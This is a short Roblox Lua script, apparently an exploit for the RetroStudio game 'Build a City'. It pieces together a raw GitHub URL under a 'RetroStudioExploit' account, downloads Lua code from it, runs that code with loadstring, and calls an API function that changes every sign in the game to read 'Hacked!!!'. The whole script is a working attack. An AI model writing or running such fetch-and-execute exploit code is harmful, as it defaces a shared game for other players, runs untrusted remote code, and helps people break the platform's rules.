local txt = "Hacked!!!"

function loadScript(url:string)
    return loadstring(game:HttpGet(url))()
end

local head = 'https://raw.githubusercontent.com/'
local suffix = '/refs/heads/main/'
local github = 'RetroStudioExploit/'

local API = loadScript(head ..github .. 'RetroScripts' .. suffix .. 'retrostudio/BuildaCity/BCAPI.lua')

API.changeAllSign(txt)
